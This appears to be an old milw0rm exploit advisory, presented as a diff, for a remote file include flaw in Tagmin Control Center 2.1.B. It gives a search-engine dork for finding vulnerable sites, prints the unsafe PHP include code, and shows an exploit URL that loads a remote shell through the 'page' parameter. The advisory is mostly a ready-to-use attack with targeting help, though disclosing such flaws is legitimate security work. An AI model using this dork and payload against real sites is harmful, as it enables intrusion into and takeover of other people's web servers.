@@ -1,0 +1,28 @@
+ Tagmin C.C 2.1.B Remote File Include
+########################################
++Advisory #3
++Product :Tagmin Control Center 2.1.B
++Develop: http://ds3.bbminc.net/tagit2b/
++Dork: inurl:"/tagit2b/"
++Vulnerable: Remote File Include
++Risk:High
++Discovered:by Kernel-32
++Contact: kernel-32@linuxmail.org
++Homepage: http://kernel-32.blogspot.com
++Greetz: BeLa ;)
+########################################
+Vulnerable code:
+----------------
+if(isset($_GET['load']) && $_GET['load'] == "dtu" or $_GET['load'] == "tag") {
+include("$page.php");
+}
+else {
+include("tagviewer.php");
+}
+?>
+
+---------------
+Vulnerable:
+http://site/path/index.php?page=shell
+
+# milw0rm.com [2006-09-28]
